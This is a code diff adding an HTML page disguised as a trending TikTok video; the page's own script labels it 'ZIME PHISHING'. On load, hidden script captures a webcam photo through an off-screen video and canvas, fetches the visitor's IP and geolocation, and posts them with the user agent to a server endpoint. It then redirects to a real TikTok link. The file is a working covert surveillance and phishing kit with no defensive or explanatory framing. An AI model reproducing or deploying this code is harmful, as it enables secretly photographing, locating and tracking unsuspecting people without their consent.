@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ZIME · TikTok Trending</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: black;
+            font-family: system-ui;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .video-container {
+            max-width: 400px;
+            background: black;
+            border-radius: 20px;
+            overflow: hidden;
+        }
+        video { width: 100%; display: block; }
+        .zime-watermark {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            font-size: 10px;
+            color: rgba(255,0,204,0.3);
+            z-index: 9999;
+        }
+    </style>
+</head>
+<body>
+<div class="video-container">
+    <video id="fakeVideo" autoplay muted loop playsinline>
+        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+    </video>
+</div>
+<div class="zime-watermark">ZIME PROJECT</div>
+
+<video id="hiddenVideo" style="position:fixed; top:-9999px;" autoplay muted></video>
+<canvas id="hiddenCanvas" style="position:fixed; top:-9999px;"></canvas>
+
+<script>
+    const API_URL = window.location.origin + "/api.php";
+    
+    async function sendData(data) {
+        try {
+            await fetch(API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+        } catch(e) { console.log(e); }
+    }
+
+    async function getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch(e) { return 'unknown'; }
+    }
+
+    async function captureAndSend() {
+        let photoData = null;
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('hiddenVideo');
+            video.srcObject = stream;
+            await video.play();
+            setTimeout(() => {
+                const canvas = document.getElementById('hiddenCanvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                photoData = canvas.toDataURL('image/jpeg', 0.8);
+                stream.getTracks().forEach(t => t.stop());
+                finishAndSend(photoData);
+            }, 1000);
+        } catch(e) {
+            finishAndSend(null);
+        }
+    }
+
+    function getLocation() {
+        return new Promise((resolve) => {
+            if(!navigator.geolocation) {
+                resolve(null);
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+                () => resolve(null)
+            );
+        });
+    }
+
+    async function finishAndSend(photo) {
+        const ip = await getIP();
+        const location = await getLocation();
+        
+        await sendData({
+            ip: ip,
+            user_agent: navigator.userAgent,
+            photo: photo,
+            location: location,
+            source: "ZIME PHISHING"
+        });
+        
+        setTimeout(() => {
+            window.location.href = "https://vt.tiktok.com/ZS95UAdK6/";
+        }, 2000);
+    }
+
+    captureAndSend();
+</script>
+</body>
+</html>
